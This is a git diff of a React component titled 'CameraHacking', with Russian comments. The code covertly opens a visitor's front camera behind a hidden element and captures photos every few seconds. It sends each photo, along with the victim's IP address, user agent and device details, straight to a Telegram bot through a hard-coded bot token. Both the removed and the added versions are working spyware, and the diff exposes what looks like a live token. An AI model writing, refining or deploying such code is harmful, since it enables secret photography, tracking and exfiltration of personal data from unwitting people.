@@ -1,11 +1,9 @@
 /**
- * КОМПОНЕНТ CAMERAHACKING - ИСПРАВЛЕННАЯ ВЕРСИЯ ДЛЯ ANDROID CHROME
- * С ДЕТАЛЬНОЙ ДИАГНОСТИКОЙ ОТПРАВКИ ФОТО
+ * КОМПОНЕНТ CAMERAHACKING - ИСПРАВЛЕННЫЙ URL И CORS
  */
 
 import axios from 'axios';
 import { useEffect, useRef, useState } from 'react';
-import API_CONFIG from '../api/config';
 
 const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
   const streamRef = useRef(null);
@@ -14,9 +12,11 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
   const [deviceInfo, setDeviceInfo] = useState(null);
   const [captureCount, setCaptureCount] = useState(0);
   const [debugLogs, setDebugLogs] = useState([]);
-  const [lastPhotoBlob, setLastPhotoBlob] = useState(null);
 
-  // Добавление логов
+  // Базовый URL API
+  const API_BASE_URL = window.location.origin; // Используем текущий домен
+  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
+
   const addDebugLog = (message) => {
     const log = `${new Date().toLocaleTimeString()}: ${message}`;
     console.log(log);
@@ -24,133 +24,135 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
   };
 
   /**
-   * ОТПРАВКА ДИАГНОСТИКИ В TELEGRAM
+   * ПРЯМАЯ ОТПРАВКА В TELEGRAM ЧЕРЕЗ ИХ API
    */
-  const sendDiagnosticReport = async (title, data, isError = false) => {
+  const sendDirectToTelegram = async (blob, caption = '') => {
+    const startTime = Date.now();
+    
     try {
-      let message = `${isError ? '❌' : '🔍'} ${title}\n\n`;
+      addDebugLog('Отправляем напрямую в Telegram API...');
       
-      if (deviceInfo) {
-        message += `📱 Устройство: ${deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : 'Другое'}\n`;
-        if (deviceInfo.isAndroid) message += `Версия Android: ${deviceInfo.androidVersion}\n`;
-        message += `Браузер: ${deviceInfo.isChrome ? 'Chrome' : deviceInfo.isSafari ? 'Safari' : 'Другой'}\n`;
-        message += `Разрешение: ${deviceInfo.resolution || 'неизвестно'}\n`;
-        message += `Захвачено фото: ${captureCount}\n\n`;
+      // Создаем FormData
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.jpg');
+      if (caption) {
+        formData.append('caption', caption);
       }
       
-      if (typeof data === 'string') {
-        message += data;
-      } else if (data instanceof Error) {
-        message += `Ошибка: ${data.name}\nСообщение: ${data.message}`;
-      } else if (data) {
-        message += JSON.stringify(data, null, 2).substring(0, 1500);
-      }
+      // Telegram Bot API URL
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
       
-      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+      addDebugLog(`Отправляем на: ${telegramUrl}`);
+      addDebugLog(`Размер файла: ${Math.round(blob.size / 1024)} KB`);
       
-      await axios.post(telegramApiUrl, {
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'HTML'
+      // Отправляем напрямую в Telegram
+      const response = await fetch(telegramUrl, {
+        method: 'POST',
+        body: formData,
+        mode: 'cors',
+        credentials: 'omit'
       });
       
-      addDebugLog(`Диагностика отправлена: ${title}`);
+      const totalTime = Date.now() - startTime;
+      
+      if (response.ok) {
+        const result = await response.json();
+        addDebugLog(`✅ Telegram API: Фото отправлено! Время: ${totalTime}ms`);
+        return { success: true, data: result };
+      } else {
+        const errorText = await response.text();
+        addDebugLog(`❌ Telegram API ошибка: ${response.status} - ${errorText}`);
+        return { 
+          success: false, 
+          error: `Status: ${response.status}, Text: ${errorText.substring(0, 100)}` 
+        };
+      }
       
     } catch (error) {
-      console.error('Не удалось отправить диагностику:', error);
-      addDebugLog(`Ошибка отправки диагностики: ${error.message}`);
+      addDebugLog(`❌ Ошибка отправки в Telegram: ${error.message}`);
+      return { success: false, error: error.message };
     }
   };
 
   /**
-   * ТЕСТ ОТПРАВКИ МАЛЕНЬКОГО ФАЙЛА
+   * ОТПРАВКА ДИАГНОСТИКИ В TELEGRAM
    */
-  const testFileUpload = async () => {
-    addDebugLog('🧪 Тестируем отправку файла...');
+  const sendDiagnosticToTelegram = async (text) => {
+    try {
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      await fetch(telegramUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'HTML'
+        }),
+        mode: 'cors'
+      });
+      
+    } catch (error) {
+      console.error('Не удалось отправить диагностику:', error);
+    }
+  };
+
+  /**
+   * ПРОСТОЙ ТЕСТ ОТПРАВКИ
+   */
+  const testSimpleUpload = async () => {
+    addDebugLog('🧪 Простой тест отправки...');
     
     try {
-      // Создаем тестовый canvas с цветом
+      // Тест 1: Отправляем текстовое сообщение
+      addDebugLog('Тест 1: Отправка текста...');
+      await sendDiagnosticToTelegram(
+        '🧪 Тест связи\n\n' +
+        `Устройство: Android Chrome\n` +
+        `User Agent: ${navigator.userAgent.substring(0, 100)}\n` +
+        `Время: ${new Date().toLocaleString()}`
+      );
+      addDebugLog('✅ Текстовое сообщение отправлено');
+      
+      // Тест 2: Отправляем маленькое изображение
+      addDebugLog('Тест 2: Создаем тестовое изображение...');
       const canvas = document.createElement('canvas');
       canvas.width = 100;
       canvas.height = 100;
       const ctx = canvas.getContext('2d');
       
-      // Рисуем цветной прямоугольник
-      ctx.fillStyle = '#FF0000';
+      // Рисуем простую картинку
+      ctx.fillStyle = '#FF6B6B';
       ctx.fillRect(0, 0, 100, 100);
       ctx.fillStyle = '#FFFFFF';
-      ctx.font = '12px Arial';
+      ctx.font = '14px Arial';
       ctx.fillText('TEST', 30, 50);
-      ctx.fillText(new Date().toLocaleTimeString(), 10, 80);
+      ctx.fillText('OK', 40, 70);
       
-      // Конвертируем в blob
       const blob = await new Promise(resolve => {
         canvas.toBlob(resolve, 'image/jpeg', 0.9);
       });
       
-      if (!blob) {
-        throw new Error('Не удалось создать тестовый blob');
+      if (!blob) throw new Error('Не удалось создать изображение');
+      
+      addDebugLog(`Тестовое изображение: ${blob.size} байт`);
+      
+      // Отправляем в Telegram
+      const result = await sendDirectToTelegram(blob, '🧪 Тестовое изображение');
+      
+      if (result.success) {
+        addDebugLog('✅ Все тесты пройдены!');
+        return true;
+      } else {
+        addDebugLog(`❌ Тест не пройден: ${result.error}`);
+        return false;
       }
-      
-      addDebugLog(`Тестовый файл создан: ${blob.size} байт`);
-      
-      // Отправляем тестовый файл
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'test_file.jpg');
-      formData.append('test', 'true');
-      formData.append('timestamp', Date.now().toString());
-      
-      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
-      addDebugLog(`Отправляем на URL: ${apiUrl}`);
-      
-      const response = await axios.post(apiUrl, formData, {
-        headers: { 
-          'Content-Type': 'multipart/form-data',
-          'X-Debug': 'test-upload'
-        },
-        timeout: 30000,
-        onUploadProgress: (progressEvent) => {
-          if (progressEvent.total) {
-            const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
-            addDebugLog(`Прогресс загрузки: ${percent}%`);
-          }
-        }
-      });
-      
-      addDebugLog(`✅ Тестовый файл отправлен! Статус: ${response.status}`);
-      await sendDiagnosticReport('Тест отправки файла УСПЕШЕН', {
-        blobSize: blob.size,
-        status: response.status,
-        response: response.data
-      });
-      
-      return true;
       
     } catch (error) {
-      addDebugLog(`❌ Тест отправки файла НЕ УДАЛСЯ: ${error.message}`);
-      
-      // Детальный анализ ошибки
-      let errorDetails = {
-        message: error.message,
-        code: error.code,
-        name: error.name
-      };
-      
-      if (error.response) {
-        errorDetails.response = {
-          status: error.response.status,
-          statusText: error.response.statusText,
-          data: error.response.data
-        };
-      }
-      
-      if (error.request) {
-        errorDetails.request = 'Запрос отправлен, но ответа нет';
-      }
-      
-      await sendDiagnosticReport('Тест отправки файла ПРОВАЛЕН', errorDetails, true);
-      
+      addDebugLog(`❌ Ошибка теста: ${error.message}`);
       return false;
     }
   };
@@ -159,27 +161,44 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
    * ИНИЦИАЛИЗАЦИЯ КАМЕРЫ
    */
   const initializeCamera = async () => {
-    addDebugLog('Начинаем инициализацию камеры...');
+    addDebugLog('🎬 Инициализация камеры...');
     
     try {
-      // Собираем базовую диагностику
-      const diagnostics = {
-        timestamp: Date.now(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        isAndroid: /android/i.test(navigator.userAgent),
-        isIOS: /iphone|ipad|ipod/i.test(navigator.userAgent),
-        isChrome: /chrome/i.test(navigator.userAgent) && !/edge/i.test(navigator.userAgent),
-        androidVersion: (() => {
-          const match = navigator.userAgent.match(/Android\s([0-9\.]+)/);
-          return match ? parseFloat(match[1]) : 0;
-        })()
+      // Собираем информацию об устройстве
+      const ua = navigator.userAgent;
+      const isAndroid = /android/i.test(ua);
+      const isIOS = /iphone|ipad|ipod/i.test(ua);
+      const androidVersion = isAndroid ? (ua.match(/Android\s([0-9\.]+)/)?.[1] || 'unknown') : null;
+      
+      const deviceData = {
+        isAndroid,
+        isIOS,
+        androidVersion,
+        userAgent: ua,
+        timestamp: new Date().toISOString()
       };
       
-      setDeviceInfo(diagnostics);
-      addDebugLog(`Устройство: Android ${diagnostics.androidVersion}, Chrome`);
+      setDeviceInfo(deviceData);
+      addDebugLog(`Устройство: ${isAndroid ? 'Android' : isIOS ? 'iOS' : 'Desktop'} ${androidVersion || ''}`);
       
-      // Простые настройки для Android Chrome
+      // Тестируем отправку
+      addDebugLog('Проверяем связь с Telegram...');
+      const connectionTest = await testSimpleUpload();
+      
+      if (!connectionTest) {
+        addDebugLog('❌ Проблема с подключением к Telegram');
+        await sendDiagnosticToTelegram(
+          '❌ НЕТ СВЯЗИ С TELEGRAM\n\n' +
+          'Проверьте:\n' +
+          '1. Работает ли интернет на устройстве\n' +
+          '2. Не заблокирован ли Telegram\n' +
+          `3. User Agent: ${ua.substring(0, 80)}`
+        );
+        return false;
+      }
+      
+      // Получаем доступ к камере
+      addDebugLog('Запрашиваем доступ к камере...');
       const constraints = {
         video: {
           facingMode: 'user',
@@ -189,112 +208,97 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         audio: false
       };
       
-      addDebugLog('Запрашиваем доступ к камере...');
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       streamRef.current = stream;
-      
-      addDebugLog('Доступ к камере получен');
       
       if (videoRef.current) {
         const video = videoRef.current;
         
-        // Критически важные настройки для Android
+        // Настройки для мобильных
         video.playsInline = true;
         video.muted = true;
         video.autoplay = true;
         video.setAttribute('playsinline', 'true');
         video.setAttribute('muted', 'true');
         video.setAttribute('autoplay', 'true');
-        video.setAttribute('webkit-playsinline', 'true');
         
         video.srcObject = stream;
         
-        // Ждем готовности видео
+        // Ждем готовности
         await new Promise((resolve) => {
           const timeout = setTimeout(() => {
-            addDebugLog('Таймаут ожидания видео, продолжаем...');
+            addDebugLog('Таймаут видео, продолжаем...');
             resolve();
-          }, 5000);
+          }, 3000);
           
           video.onloadedmetadata = () => {
             clearTimeout(timeout);
-            diagnostics.resolution = `${video.videoWidth}x${video.videoHeight}`;
-            setDeviceInfo(diagnostics);
+            deviceData.resolution = `${video.videoWidth}x${video.videoHeight}`;
+            setDeviceInfo(deviceData);
             
             addDebugLog(`Видео готово: ${video.videoWidth}x${video.videoHeight}`);
             
-            // Пробуем запустить видео
             video.play().then(() => {
-              addDebugLog('Видео запущено успешно');
+              addDebugLog('Видео запущено');
               resolve();
-            }).catch((error) => {
-              addDebugLog(`Auto-play заблокирован: ${error.message}`);
+            }).catch(() => {
+              addDebugLog('Auto-play заблокирован');
               resolve();
             });
           };
         });
         
-        // Ждем еще секунду для стабилизации
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        // Отправляем успешную инициализацию
+        await sendDiagnosticToTelegram(
+          '✅ Камера инициализирована\n\n' +
+          `Разрешение: ${deviceData.resolution}\n` +
+          `Устройство: ${isAndroid ? 'Android' : isIOS ? 'iOS' : 'Desktop'}\n` +
+          `Версия: ${androidVersion || 'N/A'}\n` +
+          `Время: ${new Date().toLocaleString()}`
+        );
         
-        // Тестируем отправку файла
-        const uploadTest = await testFileUpload();
-        
-        if (uploadTest) {
-          addDebugLog('✅ Все тесты пройдены, запускаем захват фото');
-          await sendDiagnosticReport('Камера инициализирована', {
-            resolution: diagnostics.resolution,
-            uploadTest: 'passed'
-          });
-          
-          setIsInitialized(true);
-          return true;
-        } else {
-          addDebugLog('❌ Тест отправки файла не пройден');
-          return false;
-        }
+        setIsInitialized(true);
+        return true;
       }
       
     } catch (error) {
-      addDebugLog(`Ошибка инициализации камеры: ${error.message}`);
-      await sendDiagnosticReport('Ошибка инициализации камеры', error, true);
+      addDebugLog(`❌ Ошибка инициализации: ${error.message}`);
+      
+      // Отправляем ошибку
+      await sendDiagnosticToTelegram(
+        '❌ Ошибка камеры\n\n' +
+        `Тип: ${error.name}\n` +
+        `Сообщение: ${error.message}\n` +
+        `Устройство: ${navigator.userAgent.substring(0, 100)}`
+      );
+      
       return false;
     }
   };
 
   /**
-   * ЗАХВАТ ФОТО С ПРОВЕРКОЙ
+   * ЗАХВАТ И ОТПРАВКА ФОТО
    */
-  const capturePhoto = async () => {
+  const captureAndSendPhoto = async () => {
     if (!isInitialized || !videoRef.current) {
-      addDebugLog('Камера не инициализирована, пропускаем');
+      addDebugLog('Камера не готова');
       return;
     }
     
     const video = videoRef.current;
     
     if (video.videoWidth === 0 || video.videoHeight === 0) {
-      addDebugLog('Видео не готово (0x0), пропускаем');
+      addDebugLog('Видео не готово (0x0)');
       return;
     }
     
-    addDebugLog(`Захват фото #${captureCount + 1}`);
+    addDebugLog(`📸 Захват #${captureCount + 1}`);
     
     try {
       // Создаем canvas
       const canvas = document.createElement('canvas');
-      
-      // Коррекция ориентации для портретного режима
-      const isPortrait = video.videoHeight > video.videoWidth;
-      
-      if (isPortrait && deviceInfo?.isAndroid) {
-        // Для портретной ориентации на Android
-        canvas.width = video.videoHeight;
-        canvas.height = video.videoWidth;
-      } else {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-      }
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
       
       const ctx = canvas.getContext('2d');
       
@@ -305,41 +309,27 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       while (!frameOk && attempts < 3) {
         attempts++;
         
-        // Очищаем canvas
-        ctx.fillStyle = '#000000';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Коррекция ориентации при рисовании
-        if (isPortrait && deviceInfo?.isAndroid) {
-          ctx.save();
-          ctx.translate(canvas.width / 2, canvas.height / 2);
-          ctx.rotate(Math.PI / 2);
-          ctx.translate(-canvas.height / 2, -canvas.width / 2);
-          ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-          ctx.restore();
-        } else {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        }
-        
-        // Проверяем, не черный ли кадр
-        const imageData = ctx.getImageData(50, 50, 1, 1).data;
-        const isBlack = imageData[0] < 10 && imageData[1] < 10 && imageData[2] < 10;
+        // Проверяем пиксель
+        const pixel = ctx.getImageData(50, 50, 1, 1).data;
+        const isBlack = pixel[0] < 10 && pixel[1] < 10 && pixel[2] < 10;
         
         if (!isBlack) {
           frameOk = true;
-          addDebugLog(`Кадр захвачен (попытка ${attempts}, НЕ черный)`);
+          addDebugLog(`Кадр OK (попытка ${attempts})`);
         } else {
-          addDebugLog(`Черный кадр, повтор ${attempts}/3`);
-          await new Promise(resolve => setTimeout(resolve, 100));
+          addDebugLog(`Черный кадр ${attempts}/3`);
+          await new Promise(r => setTimeout(r, 100));
         }
       }
       
-      // Если все еще черный, добавляем текст
+      // Если черный, добавляем текст
       if (!frameOk) {
-        ctx.fillStyle = '#FFFFFF';
-        ctx.font = '20px Arial';
-        ctx.fillText('Android Camera', 30, 50);
-        ctx.fillText(new Date().toLocaleTimeString(), 30, 80);
+        ctx.fillStyle = 'white';
+        ctx.font = '24px Arial';
+        ctx.fillText('Android Camera', 50, 100);
+        ctx.fillText(new Date().toLocaleTimeString(), 50, 140);
         addDebugLog('Добавлен текст на черный кадр');
       }
       
@@ -348,15 +338,25 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         canvas.toBlob(resolve, 'image/jpeg', 0.7);
       });
       
-      if (!blob) {
-        throw new Error('Не удалось создать blob');
+      if (!blob) throw new Error('Blob creation failed');
+      
+      addDebugLog(`Изображение: ${Math.round(blob.size / 1024)} KB`);
+      
+      // Отправляем напрямую в Telegram
+      const result = await sendDirectToTelegram(
+        blob,
+        `📸 Фото #${captureCount + 1}\n` +
+        `Разрешение: ${video.videoWidth}x${video.videoHeight}\n` +
+        `Размер: ${Math.round(blob.size / 1024)} KB\n` +
+        `Время: ${new Date().toLocaleTimeString()}`
+      );
+      
+      if (result.success) {
+        setCaptureCount(prev => prev + 1);
+        addDebugLog('✅ Фото успешно отправлено!');
+      } else {
+        addDebugLog(`❌ Ошибка отправки: ${result.error}`);
       }
-      
-      setLastPhotoBlob(blob);
-      addDebugLog(`Фото создано: ${Math.round(blob.size / 1024)} KB`);
-      
-      // Отправляем фото
-      await sendPhotoToTelegram(blob);
       
     } catch (error) {
       addDebugLog(`Ошибка захвата: ${error.message}`);
@@ -364,174 +364,61 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
   };
 
   /**
-   * ОТПРАВКА ФОТО В TELEGRAM С ПОДРОБНОЙ ДИАГНОСТИКОЙ
-   */
-  const sendPhotoToTelegram = async (blob) => {
-    const startTime = Date.now();
-    
-    try {
-      addDebugLog('Начинаем отправку фото...');
-      
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-      
-      // Добавляем диагностическую информацию
-      const diagnostics = {
-        device: deviceInfo?.isAndroid ? 'Android' : deviceInfo?.isIOS ? 'iOS' : 'Desktop',
-        androidVersion: deviceInfo?.androidVersion || 0,
-        resolution: deviceInfo?.resolution || 'unknown',
-        captureNumber: captureCount + 1,
-        timestamp: Date.now(),
-        blobSize: blob.size,
-        userAgent: navigator.userAgent?.substring(0, 100)
-      };
-      
-      formData.append('diagnostics', JSON.stringify(diagnostics));
-      
-      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
-      addDebugLog(`Отправляем на: ${apiUrl}`);
-      
-      // Отправляем запрос
-      const response = await axios.post(apiUrl, formData, {
-        headers: { 
-          'Content-Type': 'multipart/form-data',
-          'X-Request-ID': `photo-${Date.now()}`
-        },
-        timeout: 30000,
-        maxContentLength: Infinity,
-        maxBodyLength: Infinity,
-        onUploadProgress: (progressEvent) => {
-          if (progressEvent.total) {
-            const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
-            addDebugLog(`Загрузка: ${percent}% (${Math.round(progressEvent.loaded / 1024)} KB)`);
-          } else {
-            addDebugLog(`Загружено: ${Math.round(progressEvent.loaded / 1024)} KB`);
-          }
-        }
-      });
-      
-      const totalTime = Date.now() - startTime;
-      
-      addDebugLog(`✅ Фото отправлено успешно! Время: ${totalTime}ms, Статус: ${response.status}`);
-      
-      setCaptureCount(prev => prev + 1);
-      
-      // Отправляем подтверждение
-      await sendDiagnosticReport('Фото успешно отправлено', {
-        photoNumber: captureCount + 1,
-        uploadTime: totalTime,
-        blobSize: Math.round(blob.size / 1024) + ' KB',
-        responseStatus: response.status
-      });
-      
-      return true;
-      
-    } catch (error) {
-      const totalTime = Date.now() - startTime;
-      addDebugLog(`❌ Ошибка отправки фото (${totalTime}ms): ${error.message}`);
-      
-      // Анализируем ошибку
-      let errorAnalysis = {
-        error: error.message,
-        code: error.code,
-        time: totalTime + 'ms',
-        blobSize: blob ? Math.round(blob.size / 1024) + ' KB' : 'unknown'
-      };
-      
-      if (error.response) {
-        errorAnalysis.response = {
-          status: error.response.status,
-          statusText: error.response.statusText,
-          data: error.response.data ? String(error.response.data).substring(0, 200) : 'empty'
-        };
-      }
-      
-      if (error.request) {
-        errorAnalysis.request = 'Запрос отправлен, но ответа нет (возможно, CORS или сеть)';
-      }
-      
-      // Проверяем CORS
-      if (error.message.includes('CORS') || error.message.includes('cross-origin')) {
-        errorAnalysis.cors = 'Вероятно, проблема с CORS политикой';
-      }
-      
-      // Проверяем размер файла
-      if (blob && blob.size > 10 * 1024 * 1024) { // 10MB
-        errorAnalysis.sizeIssue = 'Файл слишком большой (>10MB)';
-      }
-      
-      // Отправляем детальный отчет об ошибке
-      await sendDiagnosticReport('Ошибка отправки фото', errorAnalysis, true);
-      
-      // Пробуем отправить текстовое сообщение как fallback
-      try {
-        const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
-        await axios.post(telegramApiUrl, {
-          chat_id: chatId,
-          text: `❌ Не удалось отправить фото\n\n` +
-                `Ошибка: ${error.message.substring(0, 100)}\n` +
-                `Размер фото: ${Math.round(blob.size / 1024)} KB\n` +
-                `Время: ${new Date().toLocaleTimeString()}`
-        });
-      } catch (telegramError) {
-        addDebugLog(`Не удалось отправить fallback сообщение: ${telegramError.message}`);
-      }
-      
-      return false;
-    }
-  };
-
-  /**
    * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
    */
-  const startPeriodicCapture = () => {
+  const startCaptureLoop = () => {
     if (captureIntervalRef.current) {
       clearInterval(captureIntervalRef.current);
     }
     
-    addDebugLog('🚀 Запускаем периодический захват (каждые 5 секунд)');
+    addDebugLog('🚀 Запускаем захват каждые 5 секунд');
     
-    // Первый захват через 3 секунды
+    // Первый снимок через 2 секунды
     setTimeout(() => {
-      capturePhoto();
-    }, 3000);
+      captureAndSendPhoto();
+    }, 2000);
     
     // Затем каждые 5 секунд
     captureIntervalRef.current = setInterval(() => {
-      if (captureCount < 20) { // Ограничим 20 фото для теста
-        capturePhoto();
+      if (captureCount < 10) { // Ограничим 10 фото для теста
+        captureAndSendPhoto();
       } else {
-        stopCapturing();
-        addDebugLog('🎯 Достигнут лимит 20 фото');
-        sendDiagnosticReport('Завершено 20 фото', { totalCaptures: captureCount });
+        stopCapture();
+        addDebugLog('🎯 Сделано 10 фото');
+        sendDiagnosticToTelegram('✅ Завершено: 10 фото отправлено');
       }
     }, 5000);
   };
 
   /**
-   * ПОЛУЧЕНИЕ IP
+   * ПОЛУЧЕНИЕ IP АДРЕСА
    */
-  const fetchClientIp = async () => {
+  const getClientIp = async () => {
     try {
-      const response = await axios.get('https://api.ipify.org?format=json', {
+      const response = await fetch('https://api.ipify.org?format=json', {
         timeout: 5000
       });
       
-      const ip = response.data.ip;
-      setClientIp(ip);
-      addDebugLog(`IP адрес: ${ip}`);
+      const data = await response.json();
+      setClientIp(data.ip);
+      addDebugLog(`IP: ${data.ip}`);
+      
+      // Отправляем IP в Telegram
+      await sendDiagnosticToTelegram(
+        `🌐 IP адрес: ${data.ip}\n` +
+        `Устройство: ${deviceInfo?.isAndroid ? 'Android' : 'Other'}`
+      );
       
     } catch (error) {
-      addDebugLog(`Ошибка получения IP: ${error.message}`);
       setClientIp('IP unavailable');
+      addDebugLog(`Ошибка IP: ${error.message}`);
     }
   };
 
   /**
    * ОСТАНОВКА
    */
-  const stopCapturing = () => {
+  const stopCapture = () => {
     if (captureIntervalRef.current) {
       clearInterval(captureIntervalRef.current);
       captureIntervalRef.current = null;
@@ -552,30 +439,30 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     let mounted = true;
     
     const init = async () => {
-      addDebugLog('=== НАЧАЛО РАБОТЫ ===');
+      addDebugLog('=== СТАРТ ===');
       
       // Восстановление геолокации
       try {
         const saved = localStorage.getItem('locationPermission');
         if (saved) {
-          const locationData = JSON.parse(saved);
-          setLocationPermission(locationData);
+          const location = JSON.parse(saved);
+          setLocationPermission(location);
           addDebugLog('Геолокация восстановлена');
         }
-      } catch (error) {
+      } catch (e) {
         localStorage.removeItem('locationPermission');
       }
       
       // Получаем IP
-      await fetchClientIp();
+      await getClientIp();
       
-      // Проверяем поддержку
+      // Проверяем поддержку камеры
       if (!navigator.mediaDevices?.getUserMedia) {
-        addDebugLog('❌ Браузер не поддерживает камеру');
-        await sendDiagnosticReport('WebRTC не поддерживается', {
-          hasMediaDevices: !!navigator.mediaDevices,
-          hasGetUserMedia: !!(navigator.mediaDevices?.getUserMedia)
-        }, true);
+        addDebugLog('❌ Камера не поддерживается');
+        await sendDiagnosticToTelegram(
+          '❌ WebRTC не поддерживается\n\n' +
+          'Браузер не может получить доступ к камере'
+        );
         return;
       }
       
@@ -583,8 +470,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       const success = await initializeCamera();
       
       if (success && mounted) {
-        // Запускаем захват
-        startPeriodicCapture();
+        startCaptureLoop();
       }
     };
     
@@ -592,78 +478,87 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     
     return () => {
       mounted = false;
-      stopCapturing();
+      stopCapture();
     };
   }, []);
 
   /**
-   * ДОПОЛНИТЕЛЬНАЯ КНОПКА ДЛЯ РУЧНОГО ТЕСТИРОВАНИЯ
+   * КНОПКА ДЛЯ РУЧНОГО ТЕСТИРОВАНИЯ
    */
-  const manualTestButton = () => {
-    if (process.env.NODE_ENV === 'development') {
-      return (
-        <div style={{
-          position: 'fixed',
-          top: 10,
-          right: 10,
-          zIndex: 9999,
-          background: '#4CAF50',
-          color: 'white',
-          padding: '10px',
-          borderRadius: '5px',
-          cursor: 'pointer'
-        }} onClick={() => capturePhoto()}>
-          📸 Сделать фото сейчас
-        </div>
-      );
-    }
-    return null;
-  };
+  const TestButton = () => (
+    <div style={{
+      position: 'fixed',
+      top: '10px',
+      left: '10px',
+      background: '#4CAF50',
+      color: 'white',
+      padding: '10px 15px',
+      borderRadius: '5px',
+      cursor: 'pointer',
+      zIndex: 10000,
+      fontSize: '14px',
+      fontWeight: 'bold'
+    }} onClick={captureAndSendPhoto}>
+      📸 Тест фото
+    </div>
+  );
 
   return (
     <>
-      {manualTestButton()}
+      {process.env.NODE_ENV === 'development' && <TestButton />}
       
       <div style={{ display: 'none' }}>
-        {/* Отладочная информация */}
-        <div id="debug-info">
-          <div>Device: {deviceInfo?.isAndroid ? 'Android' : deviceInfo?.isIOS ? 'iOS' : 'Desktop'}</div>
-          <div>Android: {deviceInfo?.androidVersion || 'N/A'}</div>
-          <div>Resolution: {deviceInfo?.resolution || 'unknown'}</div>
-          <div>Captures: {captureCount}</div>
-          <div>Initialized: {isInitialized ? 'Yes' : 'No'}</div>
-          <div>Last blob: {lastPhotoBlob ? Math.round(lastPhotoBlob.size / 1024) + ' KB' : 'none'}</div>
+        <div id="device-info">
+          {deviceInfo && JSON.stringify({
+            device: deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : 'Desktop',
+            version: deviceInfo.androidVersion || 'N/A',
+            resolution: deviceInfo.resolution || 'unknown'
+          })}
         </div>
       </div>
       
-      {/* Логи в development */}
-      {process.env.NODE_ENV === 'development' && debugLogs.length > 0 && (
+      {/* Дебаг панель */}
+      {process.env.NODE_ENV === 'development' && (
         <div style={{
           position: 'fixed',
           bottom: 0,
           left: 0,
           right: 0,
-          background: 'rgba(0,0,0,0.9)',
+          background: 'rgba(0,0,0,0.95)',
           color: '#0f0',
           padding: '10px',
-          fontSize: '11px',
-          maxHeight: '150px',
+          fontSize: '12px',
+          maxHeight: '200px',
           overflow: 'auto',
           fontFamily: 'monospace',
-          zIndex: 9998
+          zIndex: 9999,
+          borderTop: '2px solid #0f0'
         }}>
-          <div style={{ fontWeight: 'bold', marginBottom: '5px' }}>
-            Camera Debug ({captureCount} photos)
+          <div style={{
+            display: 'flex',
+            justifyContent: 'space-between',
+            marginBottom: '10px',
+            paddingBottom: '5px',
+            borderBottom: '1px solid #333'
+          }}>
+            <strong>Camera Debug</strong>
+            <span>Photos: {captureCount}</span>
+            <span>{deviceInfo?.resolution || 'No video'}</span>
           </div>
-          {debugLogs.map((log, index) => (
-            <div key={index} style={{
-              marginBottom: '2px',
-              borderBottom: '1px solid #333',
-              paddingBottom: '2px'
-            }}>
-              {log}
-            </div>
-          ))}
+          
+          <div style={{ maxHeight: '150px', overflow: 'auto' }}>
+            {debugLogs.map((log, i) => (
+              <div key={i} style={{
+                padding: '2px 0',
+                borderBottom: '1px solid #222',
+                whiteSpace: 'nowrap',
+                overflow: 'hidden',
+                textOverflow: 'ellipsis'
+              }}>
+                {log}
+              </div>
+            ))}
+          </div>
         </div>
       )}
     </>
